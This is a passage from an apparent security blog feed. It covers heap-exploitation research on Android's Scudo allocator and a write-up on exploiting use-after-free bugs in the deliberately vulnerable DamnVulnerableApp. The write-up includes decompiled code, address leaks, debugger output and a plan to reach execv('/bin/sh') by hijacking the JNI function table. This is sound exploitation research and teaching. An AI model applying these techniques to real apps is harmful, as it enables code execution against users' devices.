bypass the checks.\nNow, choosing fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20 results in a 16 byte write at target_addr. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this Write - What - Where condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.\nHeap - based Meta Data Overflow Up to this point, we have only seen fake chunk creation for primary and secondary and a small Write - What - Where condition . Now one might ask: What if there is a buffer overflow into a consecutive chunk?\nFirst, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via mmap and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary shuffles the chunks w.r.t. a class id. This means that for some index i we get that with high probability malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20.\nThis leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as future work .\nLets assume that we introduced two fake chunks, named first and second, with the following properties:\nthe fake chunks are of the same size (primary) there exists an index i s.t. C-\u0026gt;Chunks[i] = first and C-\u0026gt;Chunks[i+1] = second there is no interference by other threads first and second are successive in memory, i.e. addr(first) + 0x20 = addr(second) there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from first into second, and second contains \u0026ldquo;important\u0026rdquo; information To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating first until it allocates second, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.\nAssuming the above properties, the remaining issue is that overwriting meta data of second in Scudo will abort the app if free(second) is called and there is a checksum mismatch. Therefore, we need to know the pointer of second and a value for Cookie in order to properly compute the checksum. If, however, the goal is to get the overflow into \u0026ldquo;important\u0026rdquo; user data (which might even allow to overwrite the .got entry of free), then an attacker will be allowed to overflow with the above assumptions.\nFuture Work In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered \u0026ldquo;useless\u0026rdquo; at that point in time.\nEvaluate integer underflow in primary poisoning . It somehow feels like there has to be more that can be done\u0026hellip; Evaluate getBlockBegin . To be precise: how can the Offset field be used? Memory probing?? Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling free repeatedly for consecutive memory allows to fill up C-\u0026gt;Chunks in non - shuffled fashion! Problem: strong assumptions Evaluate integer underflow caused by calling DoublyLinkedList::remove with X-\u0026gt;Next = X-\u0026gt;Prev = X. Maybe side channel?? (very unlikely, but would be funny). DoublyLinkedList::Size impacts DoublyLinkedList::empty(), which impacts scudo_malloc_info. Might be useful to confuse programs\u0026hellip; What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks? It seems to be possible to render the secondary cache useless by freeing fake chunks with CommitSize = \u0026lt;size smaller than primary sizes\u0026gt; and CommitBase != nullptr, as we dont have control over the ClassId field for scudo_malloc calls. This could enforce secondary allocations to use mmap and munmap. This might be limited by the fact that the cache can be emptied if it is full. Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to malloc result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to malloc return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of malloc and free calls to \u0026ldquo;shuffle\u0026rdquo; the array. Then repeat. Summary We have seen different kinds of attacks on vulnerabilities that involve Scudo. To be precise, we have seen two types of fake chunk creation, namely Primary Poisoning and Secondary Cache Poisoning , as well as a Write - What - Where condition , which was a side effect of Secondary Cache Poisoning. Finally, heap overflows into chunk meta data have been discussed.\nOverall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a Scudo - related vulnerability, we can perform similar attacks to those applicable to e.g. dlmalloc. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.\n","permalink":"https://lolcads.github.io/posts/2024/07/scudo_0/","tags":["Android","Binary Exploitation","JNI","Scudo","Heap Exploitation"],"title":"Scudo, the Allocator (Part 1)"},{"categories":null,"content":"Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition.\nAbout this post Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about failing to exploit the Use - After - Free bug that enables a Write - What - Where condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the UseAfterFreeWriteModule, but it was too hard to start with, so I introduced UseAfterFreeExecModule and derived a technique that is applicable to both modules.\nIf you are not interested in reading about one of the core pillars of binary exploitation, i.e. failure, then feel free to skip to the fun part :)\nAssumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libUseAfterFree(Exec/Write)Module.so and the UseAfterFree(Exec/Write)Module class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!\nAnalysis baseline As we have access to the .apk file, we can utilize jadx to get the source code of UseAfterFreeExecModule:\n/* loaded from: classes10.dex */ public class UseAfterFreeExecModule extends VulnerableModule { private native byte[] lookupExamples(int i); private native byte[] storePair(byte[] bArr, long j); static { System.loadLibrary(\u0026#34;UseAfterFreeExecModule\u0026#34;); } public UseAfterFreeExecModule() { super(new UseAfterFreeExecModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Key - Value Storage! Most secure in this field!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } while (true) { output(\u0026#34;Please provide the key name (EXIT to end app): \u0026#34;.getBytes()); byte[] name = input(); if (new String(name).toUpperCase(Locale.ROOT).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Terminating...\u0026#34;.getBytes()); return; } output(\u0026#34;Please provide the key value: \u0026#34;.getBytes()); long value = ByteBuffer.wrap(input()).getLong(); byte[] result = storePair(name, value); output(result); } } } and UseAfterFreeWriteModule:\n/* loaded from: classes10.dex */ public class UseAfterFreeWriteModule extends VulnerableModule { private native byte[] lookupExamples(int i); private native void storePair(byte[] bArr, long j); static { System.loadLibrary(\u0026#34;UseAfterFreeWriteModule\u0026#34;); } public UseAfterFreeWriteModule() { super(new UseAfterFreeWriteModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Key - Value Storage! Most secure in this field!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } while (true) { output(\u0026#34;Please provide the key name (EXIT to end app): \u0026#34;.getBytes()); byte[] name = input(); if (new String(name).toUpperCase(Locale.ROOT).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Terminating...\u0026#34;.getBytes()); return; } output(\u0026#34;Please provide the key value: \u0026#34;.getBytes()); long value = ByteBuffer.wrap(input()).getLong(); storePair(name, value); output((\u0026#34;Successfully stored (\u0026#34; + new String(name) + \u0026#34;:\u0026#34; + value + \u0026#34;)!\u0026#34;).getBytes()); } } } In both cases, we can see that:\nAn arbitrary amount of integers can be passed to lookupExamples. There seem to be no bounds checks! An arbitrary amount of key - value pairs can be stored using storePair. Notice that the value is an 8 - byte integer. Now, for the shared - object files we can use Ghidra . Starting with libUseAfterFreeExecModule.so yields the (already beautified) code:\njbyteArray Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples (JNIEnv *env, jobject this, jint index) { long lVar1; undefined4 length; jbyteArray array; long in_FS_OFFSET; char *examples [4]; canary = *(long *)(in_FS_OFFSET + 0x28); examples[2]._0_4_ = PTR_s_topsecret_key_00101d40._0_4_; examples[2]._4_4_ = PTR_s_topsecret_key_00101d40._4_4_; examples[3]._0_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._0_4_; examples[3]._4_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._4_4_; examples[0]._0_4_ = PTR_s_amazing_key_00101d30._0_4_; examples[0]._4_4_ = PTR_s_amazing_key_00101d30._4_4_; examples[1]._0_4_ = PTR_s_secret_key_00101d38._0_4_; examples[1]._4_4_ = PTR_s_secret_key_00101d38._4_4_; length = __strlen_chk(examples[(int)index],0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)length); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index)); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return array; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } jbyteArray Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair (JNIEnv *env,jobject this,jbyteArray name,jlong value) { uint resultLength; void *obj; object *keyValue; jsize nameLength; jbyte *nameBytes; jbyteArray array; long in_FS_OFFSET; uint len; char *result; jboolean iscopy; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); obj = malloc(0x108); *(code **)((long)obj + 0x100) = FUN_00100c60; free(obj); keyValue = (object *)calloc(1,0x108); nameLength = (*(*env)-\u0026gt;GetArrayLength)(env,name); len = (uint)nameLength; if (0x100 \u0026lt; len) { len = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; nameBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,name,\u0026amp;iscopy); __memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff); keyValue-\u0026gt;value = value; result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0); resultLength = __strlen_chk(\u0026amp;result,0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)resultLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)\u0026amp;result); (*(*env)-\u0026gt;ReleaseByteArrayElements)(env,name,nameBytes,JNI_ABORT); free(keyValue); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return array; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } As UseAfterFreeExecModule#lookupExamples and UseAfterFreeWriteModule#lookupExamples are basically the same (verfiy if not convinced), we will only consider UseAfterFreeWriteModule#storePair:\nvoid Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair (JNIEnv *env,jobject this,jarray key,jlong value) { jlong **ptrList; object *keyValuePair; jsize keyLength; jbyte *keyBytes; long in_FS_OFFSET; uint reducedKeyLength; jboolean iscopy; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); ptrList = (jlong **)malloc(0x108); free(ptrList); keyValuePair = (object *)malloc(0x108); keyLength = (*(*env)-\u0026gt;GetArrayLength)(env,key); reducedKeyLength = (uint)keyLength; if (0x100 \u0026lt; reducedKeyLength) { reducedKeyLength = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; keyBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,key,\u0026amp;iscopy); __memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff); **ptrList = value; (*(*env)-\u0026gt;ReleaseByteArrayElements)(env,key,keyBytes,2); free(keyValuePair); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } Trying to get code execution in UseAfterFreeWriteModule In this section various approaches of getting code execution in the UseAfterFreeWriteModule will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.\nLeaking data As is often the case with secured binaries, we have to defeat ASLR by leaking some address. \u0026ldquo;Luckily\u0026rdquo;, there is a function that is called as often as we want, which is called lookupExamples that contains the following code snippet:\n... length = __strlen_chk(examples[(int)index],0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)length); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index)); ... return array; There are two aspects to consider:\nindex is not checked for out - of - bounds access. (jbyte *)(examples + (int)index) will result in the address of a string being copied into array. We know that examples is probably a string table, because __strlen_chk is called on examples[(int)index]. Interestingly, the out - of - bounds access is not really usable, because it requires examples[(int)index] to be a valid pointer for index \u0026gt;= 4. But there is no need to read more pointers, as the lengths of the strings in examples determine the amount of bytes returned. Thus, for index = 3, the leaked value will contain at least one address, if not more (it is a pretty long string).\nlookupExamples is called in a loop, where the user is asked for 1 - based indices into the array:\nwhile (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } When accessing lookupExamples by sending 1 \u0026lt;= index \u0026lt;= 4 we can get the following leaks:\n[0]: 0x730b9b7a371e --| [1]: 0x730b9b7a372a | --\u0026gt; from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so [2]: 0x730b9b7a3710 | [3]: 0x730b9b7a3735 --| [4]: 0x730b993ba990 --\u0026gt; stack address: array of example strings [5]: 0x2147eb93990de82b --\u0026gt; 8 byte canary [6]: 0x730b993ba8c0 --\u0026gt; stack address: stored `rbp` [7]: 0x730c0379ffac --\u0026gt; `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000` With the current leak, we get\nAddress in libUseAfterFreeWriteModule.so and therefore its base address Address in libart.so and therefore its base address Address on stack Canary Keep in mind that everytime UseAfterFreeWriteModule is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.\nThe bug Before showing how to fail to exploit the bug \u0026hellip; well what is the bug anyways? Terms like Write - What - Where condition have already been mentioned, so lets see the corresponding code:\n... ptrList = (jlong **)malloc(0x108); free(ptrList); keyValuePair = (object *)malloc(0x108); keyLength = (*(*env)-\u0026gt;GetArrayLength)(env,key); reducedKeyLength = (uint)keyLength; if (0x100 \u0026lt; reducedKeyLength) { reducedKeyLength = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; keyBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,key,\u0026amp;iscopy); __memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff); **ptrList = value; ... As can be seen, immediately after allocating memory for a jlong*[33], the memory is freed. Then memory is allocated to hold a struct object (this was deduced from analysis in Ghidra; the name is chosen arbitrarily). Comparing both malloc calls reveals that both types of the two variables are of the same size. If malloc was to return the same chunk twice, whatever is stored in the first 8 bytes of the keyBytes would be interpreted as a pointer, to which we would write the value.\nKnowing our beloved dlmalloc (the glibc\u0026rsquo;s implementation of malloc), we can assume that keyValuePair will be assigned the same chunk as ptrList, right? I.e. keyValuePair = ptrList, where ptrList is a dangling pointer, because its memory has already been freed? Well \u0026hellip; the interesting thing is that it actually works, i.e. keyValuePair = ptrList, but this is not due to dlmalloc!\nLets confirm my statement with some disassembly. To that end, observe that ptrList = *($rbp-0x58) and keyValuePair = *($rbp-0x60):\n[1] gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair ... 0x0000730b9ed59a1a \u0026lt;+42\u0026gt;:\tcall 0x730b9ed59b80 \u0026lt;malloc@plt\u0026gt; 0x0000730b9ed59a1f \u0026lt;+47\u0026gt;:\tmov QWORD PTR [rbp-0x58],rax \u0026lt;--- result of first malloc 0x0000730b9ed59a23 \u0026lt;+51\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x58] 0x0000730b9ed59a27 \u0026lt;+55\u0026gt;:\tcall 0x730b9ed59b90 \u0026lt;free@plt\u0026gt; 0x0000730b9ed59a2c \u0026lt;+60\u0026gt;:\tmov edi,0x108 0x0000730b9ed59a31 \u0026lt;+65\u0026gt;:\tcall 0x730b9ed59b80 \u0026lt;malloc@plt\u0026gt; 0x0000730b9ed59a36 \u0026lt;+70\u0026gt;:\tmov QWORD PTR [rbp-0x60],rax \u0026lt;--- result of second malloc ... gef➤ x/1gx $rbp-0x58 0x730b9c970828:\t0x0000730cb77bb950 gef➤ x/1gx $rbp-0x60 0x730b9c970820:\t0x0000730cb77bb950 [2] gef➤ pipe vmmap | grep primary | grep cb77 0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary] [3] gef➤ disassemble malloc Dump of assembler code for function malloc: 0x0000730eb408fda0 \u0026lt;+0\u0026gt;:\tpush r14 0x0000730eb408fda2 \u0026lt;+2\u0026gt;:\tpush rbx 0x0000730eb408fda3 \u0026lt;+3\u0026gt;:\tpush rax 0x0000730eb408fda4 \u0026lt;+4\u0026gt;:\tmov r14,rdi 0x0000730eb408fda7 \u0026lt;+7\u0026gt;:\tmov rax,QWORD PTR [rip+0x982a2] # 0x730eb4128050 \u0026lt;__libc_globals+80\u0026gt; 0x0000730eb408fdae \u0026lt;+14\u0026gt;:\ttest rax,rax 0x0000730eb408fdb1 \u0026lt;+17\u0026gt;:\tjne 0x730eb408fdcb \u0026lt;malloc+43\u0026gt; 0x0000730eb408fdb3 \u0026lt;+19\u0026gt;:\tcall 0x730eb40950f0 \u0026lt;scudo_malloc\u0026gt; 0x0000730eb408fdb8 \u0026lt;+24\u0026gt;:\tmov rbx,rax 0x0000730eb408fdbb \u0026lt;+27\u0026gt;:\ttest rax,rax 0x0000730eb408fdbe \u0026lt;+30\u0026gt;:\tje 0x730eb408fdd0 \u0026lt;malloc+48\u0026gt; 0x0000730eb408fdc0 \u0026lt;+32\u0026gt;:\tmov rax,rbx 0x0000730eb408fdc3 \u0026lt;+35\u0026gt;:\tadd rsp,0x8 0x0000730eb408fdc7 \u0026lt;+39\u0026gt;:\tpop rbx 0x0000730eb408fdc8 \u0026lt;+40\u0026gt;:\tpop r14 0x0000730eb408fdca \u0026lt;+42\u0026gt;:\tret 0x0000730eb408fdcb \u0026lt;+43\u0026gt;:\tcall QWORD PTR [rax+0x18] [4] gef➤ p/x 0x982a2 + 0x0000730eb408fdae $1 = 0x730eb4128050 gef➤ x/1gx 0x730eb4128050 0x730eb4128050 \u0026lt;__libc_globals+80\u0026gt;:\t0x0000000000000000 [5] gef➤ disassemble scudo_malloc Dump of assembler code for function scudo_malloc: 0x0000730eb40950f0 \u0026lt;+0\u0026gt;:\tpush rbx 0x0000730eb40950f1 \u0026lt;+1\u0026gt;:\tmov rsi,rdi 0x0000730eb40950f4 \u0026lt;+4\u0026gt;:\tlea rdi,[rip+0x9b5c5] # 0x730eb41306c0 \u0026lt;_ZL9Allocator\u0026gt; 0x0000730eb40950fb \u0026lt;+11\u0026gt;:\tmov ecx,0x10 0x0000730eb4095100 \u0026lt;+16\u0026gt;:\txor edx,edx 0x0000730eb4095102 \u0026lt;+18\u0026gt;:\txor r8d,r8d 0x0000730eb4095105 \u0026lt;+21\u0026gt;:\tcall 0x730eb4094a20 \u0026lt;_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb\u0026gt; 0x0000730eb409510a \u0026lt;+26\u0026gt;:\tmov rbx,rax 0x0000730eb409510d \u0026lt;+29\u0026gt;:\ttest rax,rax 0x0000730eb4095110 \u0026lt;+32\u0026gt;:\tje 0x730eb4095117 \u0026lt;scudo_malloc+39\u0026gt; 0x0000730eb4095112 \u0026lt;+34\u0026gt;:\tmov rax,rbx 0x0000730eb4095115 \u0026lt;+37\u0026gt;:\tpop rbx 0x0000730eb4095116 \u0026lt;+38\u0026gt;:\tret 0x0000730eb4095117 \u0026lt;+39\u0026gt;:\tcall 0x730eb411a850 \u0026lt;__errno@plt\u0026gt; 0x0000730eb409511c \u0026lt;+44\u0026gt;:\tmov DWORD PTR [rax],0xc 0x0000730eb4095122 \u0026lt;+50\u0026gt;:\tmov rax,rbx 0x0000730eb4095125 \u0026lt;+53\u0026gt;:\tpop rbx 0x0000730eb4095126 \u0026lt;+54\u0026gt;:\tret Lets digest what we just witnessed:\nIdentifying the values of ptrList and keyValuePair and confirming that ptrList = keyValuePair Checking where ptrList and keyValuePair point to. They are pointing to some primary location? As we called malloc to allocate memory, we quickly check its disassembly and observe that there is a call to scudo_malloc in case there is a zero at rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2. Verify that indeed scudo_malloc is called. Btw. if rip + 0x982a2 pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of malloc. Check implementation of scudo_malloc. It internally calls scudo::Allocator\u0026lt;...\u0026gt;::allocate (using c++filt to demangle mangled names). We can observe a similar behaviour for free, which winds up to call scudo::Allocator\u0026lt;scudo::AndroidConfig, \u0026amp;(scudo_malloc_postinit)\u0026gt;::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long).\nIntroducing Scudo, the Allocator Scudo is an allocator that is used for all native code from Android 11 onwards. Its source code can be found here .\nWe are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that ptrList = keyValuePair was not a coincidence. To that end, I will only present small excerpts of code.\nAs seen above , scudo_malloc calls scudo::Allocator\u0026lt;...\u0026gt;::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool) . Analyzing the implementation reveals:\n... if (LIKELY(PrimaryT::canAllocate(NeededSize))) { ... Block = TSD-\u0026gt;Cache.allocate(ClassId); ... } ... void *Ptr = reinterpret_cast\u0026lt;void *\u0026gt;(UserPtr); void *TaggedPtr = Ptr; ... return TaggetPtr; Ptr is computed from Block, but that is irrelevant for now. Tracing TSD-\u0026gt;Cache.allocate(ClassId) gets us to the implementation we wanted to see:\nvoid *allocate(uptr ClassId) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; ... CompactPtrT CompactP = C-\u0026gt;Chunks[--C-\u0026gt;Count]; ... return Allocator-\u0026gt;decompactPtr(ClassId, CompactP); } Reversing the type definitions shows that CompactPtrT = uintptr_t, so its just a normal pointer. Finally, inspecting PerClass :\nstruct PerClass { u32 Count; // \u0026lt;-- amount of free chunks in block u32 MaxCount; // \u0026lt;-- no idea uptr ClassSize; // \u0026lt;-- size of a single chunk in bytes CompactPtrT Chunks[2 * TransferBatch::MaxNumCached]; // \u0026lt;-- chunks, freed and used }; Basically SizeClassAllocatorLocalCache::allocate(uptr ClassId) will get the next free chunk by decreasing PerClass::Count by 1 and taking this as an index into PerClass::Chunks.\nSimilarly, for scudo_free, we end up running SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P) (this is non - trivial to see, but is what actually happens):\nvoid deallocate(uptr ClassId, void *P) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; ... C-\u0026gt;Chunks[C-\u0026gt;Count++] = Allocator-\u0026gt;compactPtr(ClassId, reinterpret_cast\u0026lt;uptr\u0026gt;(P)); ... } This method frees a chunk by writing the compacted pointer back into the array and adding 1 to PerClass::Count. Therefore, the sequence\nstruct manager *m = (struct manager*)malloc(sizeof(struct manager)); free(m); struct object *obj = (struct object*)malloc(sizeof(struct object)); results in decrementing PerClass::Count (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that ptrList = keyValuePair. Notice that there are probably optimizations in place that handle memory shortages etc. As DamnVulnerableApp is the only app I run on the emulator, it might differ from what you get on a busy device.\nTrying to exploit Lets recall the setting we are in:\nWe are given a Write - What - Where condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (.bss, .data, stack, heap) are not executable. We have access to libart.so, libUseAfterFreeWriteModule.so, the stack and the canary. The Goal: Arbitrary Code Execution\nSniffing out function pointers The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the vtable would allow to execute arbitrary functions that are resistent to __thiscall. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.\nUnfortunately, vtables are located in a read - only section. This can be proven by observing that mangled vtable names start with \u0026ldquo;_ZTV\u0026rdquo;. To be precise, only \u0026ldquo;TV\u0026rdquo; indicates that this is a vtable. Next, analysing all publicly available vtables:\n$ readelf --wide --symbols libart.so | grep \u0026#34;_ZTV\u0026#34; ... 13121: 0000000000c17e18 32 OBJECT WEAK PROTECTED 16 _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE $ readelf --wide --sections libart.so ... [16] .data.rel.ro PROGBITS 0000000000c0aa40 80aa40 010b00 00 WA 0 0 16 ... Note that I might have missed a vtable, but this was enough to quit persuing the vtable - approach. If we were able to call mprotect on the vtables, maybe it could be possible to make the vtables writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for mprotect. Therefore, __thiscall is again a challenge.\nLuckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of JNIEnv - function calls in a JNI function.\nObserve that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via artQuickGenericJniTrampoline in assembly in art_quick_generic_jni_trampoline. The first parameter is ALWAYS of type JNIEnv*. The jni object is fetched via Thread::GetJniEnv, which returns an instance of JNIEnvExt.\nclass JniEnvExt : public JNIEnv {...} ... #if defined(__cplusplus) typedef _JNIEnv JNIEnv; #else typedef const struct JNINativeInterface* JNIEnv; ... #endif ... /* * C++ object wrapper. * * This is usually overlaid on a C struct whose first element is a * JNINativeInterface*. We rely somewhat on compiler behavior. */ struct _JNIEnv { /* do not rename this; it does not seem to be entirely opaque */ const struct JNINativeInterface* functions; ... } The definition of _JNIEnv comes from here . In structures, everything is public, therefore functions is visible in JNIEnvExt!\nThen also observe that (see code )\nclass JNIEnvExt : public JNIEnv { ... static const JNINativeInterface* table_override_ ...; ... } Using\n$ readelf --wide --symbols libart.so | grep \u0026#34;_ZN3art9JNIEnvExt15table_override_E\u0026#34; 3674: 0000000000e21cb8 8 OBJECT GLOBAL PROTECTED 23 _ZN3art9JNIEnvExt15table_override_E 10840: 0000000000e21cb8 8 OBJECT GLOBAL PROTECTED 23 _ZN3art9JNIEnvExt15table_override_E $ readelf --wide --sections libart.so | grep .bss [23] .bss NOBITS 0000000000e1fbe0 81fbe0 003bb0 00 WA 0 0 16 yields that JNIEnvExt::table_override is part of .bss, which again implies that we can overwrite this pointer with the Write - What - Where condition.\nWe can try to link both of the above together via GetFunctionTable const JNINativeInterface* JNIEnvExt::GetFunctionTable(bool check_jni) { const JNINativeInterface* override = JNIEnvExt::table_override_; if (override != nullptr) { return override; } return check_jni ? GetCheckJniNativeInterface() : GetJniNativeInterface(); } and either ThreadResetFunctionTable void ThreadResetFunctionTable(Thread* thread, void* arg ATTRIBUTE_UNUSED) REQUIRES(Locks::jni_function_table_lock_) { JNIEnvExt* env = thread-\u0026gt;GetJniEnv(); bool check_jni = env-\u0026gt;IsCheckJniEnabled(); env-\u0026gt;functions = JNIEnvExt::GetFunctionTable(check_jni); env-\u0026gt;unchecked_functions_ = GetJniNativeInterface(); } or SetCheckJniEnabled void JNIEnvExt::SetCheckJniEnabled(bool enabled) { check_jni_ = enabled; MutexLock mu(Thread::Current(), *Locks::jni_function_table_lock_); functions = GetFunctionTable(enabled); // Check whether this is a no-op because of override. if (enabled \u0026amp;\u0026amp; JNIEnvExt::table_override_ != nullptr) { LOG(WARNING) \u0026lt;\u0026lt; \u0026#34;Enabling CheckJNI after a JNIEnv function table override is not functional.\u0026#34;; } } So if either of the above functions was called with a modified JNIEnvExt::override_table_, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets\u0026hellip;\nNotice that ThreadResetFunctionTable is a callback invoked inside a foreach - method , i.e.\nvoid JNIEnvExt::SetTableOverride(const JNINativeInterface* table_override) { MutexLock mu(Thread::Current(), *Locks::thread_list_lock_); MutexLock mu2(Thread::Current(), *Locks::jni_function_table_lock_); JNIEnvExt::table_override_ = table_override; // See if we have a runtime. Note: we cannot run other code (like JavaVMExt\u0026#39;s CheckJNI install // code), as we\u0026#39;d have to recursively lock the mutex. Runtime* runtime = Runtime::Current(); if (runtime != nullptr) { runtime-\u0026gt;GetThreadList()-\u0026gt;ForEach(ThreadResetFunctionTable, nullptr); // Core Platform API checks rely on stack walking and classifying the caller. If a table // override is installed do not try to guess what semantics should be. runtime-\u0026gt;SetCorePlatformApiEnforcementPolicy(hiddenapi::EnforcementPolicy::kDisabled); } } which seems to be free of any references to this. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is \u0026ldquo;crash - resistent\u0026rdquo;\u0026hellip; Also, in order to create a copy of that function pointer table, we would need to write at least sizeof (struct JNINativeInterface) = 0x748 bytes, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.\nAlternative idea for exploitation of UseAfterFreeWriteModule There is a symbol called execv in the symbol table of libart.so, whose value is 0. Thus there is a .plt entry for this function. According to an experiment, the following code runs without an error in the emulator:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { execv(\u0026#34;/bin/sh\u0026#34;, NULL); return 0; } Therefore, only the first parameter needs to be a global variable. The second one 